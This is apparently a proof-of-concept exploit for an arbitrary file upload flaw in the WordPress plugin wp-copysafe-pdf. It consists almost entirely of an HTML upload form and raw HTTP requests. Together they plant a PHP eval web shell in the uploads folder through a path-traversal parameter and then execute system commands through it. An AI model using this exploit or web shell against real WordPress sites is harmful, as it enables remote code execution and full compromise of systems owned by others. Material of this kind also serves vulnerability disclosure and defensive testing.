[PoC]

[REQUEST 1]
	==========================================================
	[Trigger a file upload]
	 
		<form action="http://{TARGET}/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php" method="post" enctype="multipart/form-data">
			<label for="file">Filename:</label>
			<input type="file" name="wpcsp_file" ><br>
			<input type=text name="upload_path" value="../../../../uploads/">
			<input type="submit" name="submit" value="Submit">
		</form>

	[HTTP REQUEST 1]
		POST /wordpress4.1/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php HTTP/1.1
		Host: {TARGET}
		User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: en-US,en;q=0.5
		Content-Type: multipart/form-data; boundary=---------------------------3234774786382
		Content-Length: 463
		Connection: close
		Upgrade-Insecure-Requests: 1

		-----------------------------3234774786382
		Content-Disposition: form-data; name="wpcsp_file"; filename="error.php"
		Content-Type: application/octet-stream

		<?php
			@eval(@$_POST["error"]);
			
		-----------------------------3234774786382
		Content-Disposition: form-data; name="upload_path"

		../../../../uploads/
		-----------------------------3234774786382
		Content-Disposition: form-data; name="submit"

		Submit
		-----------------------------3234774786382--

	==========================================================
[REQUEST 2]
	[Then the file is accessible under]

		http://{TARGET}/wp-content/uploads/error.php

	[HTTP REQUEST 2]

		POST /wp-content/uploads/error.php HTTP/1.1
		Host: {TARGET}
		User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: en-US,en;q=0.5
		Content-Type: application/x-www-form-urlencoded
		Content-Length: 35
		Connection: close
		Upgrade-Insecure-Requests: 1

		error=system("echo XLXX");

